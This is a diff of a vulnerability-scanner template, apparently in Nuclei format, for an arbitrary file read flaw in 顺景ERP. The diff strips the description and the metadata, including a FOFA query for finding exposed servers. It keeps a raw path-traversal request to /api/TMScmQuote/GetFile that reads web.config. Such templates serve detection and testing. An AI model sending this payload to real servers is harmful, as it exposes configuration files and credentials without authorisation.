@@ -3,12 +3,8 @@ info:
   name: 顺景ERP TMScmQuoteGetFile 任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/hx6shtigiacymrwu'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: hx6shtigiacymrwu
-    fofa: body="顺景软件 WebAPI 服务端"
 http:
 - raw:
   - 'GET /api/TMScmQuote/GetFile?FullGuidFileName=/../web.config&FileName= HTTP/1.1
